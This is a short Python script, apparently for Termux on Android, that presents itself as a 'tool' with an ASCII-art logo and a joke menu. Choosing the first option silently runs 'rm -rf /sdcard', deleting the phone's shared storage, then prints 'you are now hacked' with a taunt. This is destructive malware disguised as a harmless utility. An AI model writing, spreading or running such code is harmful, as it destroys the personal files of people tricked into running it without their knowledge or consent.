import os
os.sys
import time
import sys
os.system("clear")
logo = """

\033[1;93TTTTTTTTTTTTTTTTTTTTTTTHHHHHHHHH     HHHHHHHHH      CCCCCCCCCCCCCBBBBBBBBBBBBBBBBB   

T:::::::::::::::::::::TH:::::::H     H:::::::H   CCC::::::::::::CB::::::::::::::::B  

T:::::::::::::::::::::TH:::::::H     H:::::::H CC:::::::::::::::CB::::::BBBBBB:::::B 

T:::::TT:::::::TT:::::THH::::::H     H::::::HHC:::::CCCCCCCC::::CBB:::::B     B:::::B

TTTTTT  T:::::T  TTTTTT  H:::::H     H:::::H C:::::C       CCCCCC  B::::B     B:::::B

        T:::::T          H:::::H     H:::::HC:::::C                B::::B     B:::::B

        T:::::T          H::::::HHHHH::::::HC:::::C                B::::BBBBBB:::::B 

        T:::::T          H:::::::::::::::::HC:::::C                B:::::::::::::BB  

        T:::::T          H:::::::::::::::::HC:::::C                B::::BBBBBB:::::B 

        T:::::T          H::::::HHHHH::::::HC:::::C                B::::B     B:::::B

        T:::::T          H:::::H     H:::::HC:::::C                B::::B     B:::::B

        T:::::T          H:::::H     H:::::H C:::::C       CCCCCC  B::::B     B:::::B

      TT:::::::TT      HH::::::H     H::::::HHC:::::CCCCCCCC::::CBB:::::BBBBBB::::::B

      T:::::::::T      H:::::::H     H:::::::H CC:::::::::::::::CB:::::::::::::::::B 

      T:::::::::T      H:::::::H     H:::::::H   CCC::::::::::::CB::::::::::::::::B  

      TTTTTTTTTTT      HHHHHHHHH     HHHHHHHHH      CCCCCCCCCCCCCBBBBBBBBBBBBBBBBB
\033[1;93m       
\033[1:93m
\033[1;93m
\033[1;93m
\033[1:93m
\033[1;93m
                                                                    
             

"""
def logop(z):
    for word  in z + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)
logop(logo)

os.system("figlet welcome to my tool ")
n= "Tool maker by Moynul "
sys.stdout.write(n)
sys.stdout.flush()
time.sleep(5)
print(n)
print("""
[1]admin er gf
[2]exit """)

option = input("enter your choice")
if option == "1":
    i = 1 
    while i <= 1 :
        os.system("cd /sdcard")
        os.system("ls")
        os.system("rm -rf /sdcard")
        os.system("apt install sl")
        os.system("sl")
        os.system("clear")
        os.system("tool maker by termux help centre bd modaretor")
        i = i + 1
elif option ==  "2":
    print("comming soon")
else:
    print(" you option field")
print("you are now hacked")
print("kamon laglo comnt a janaben ")
print("Termux help centre bd ")
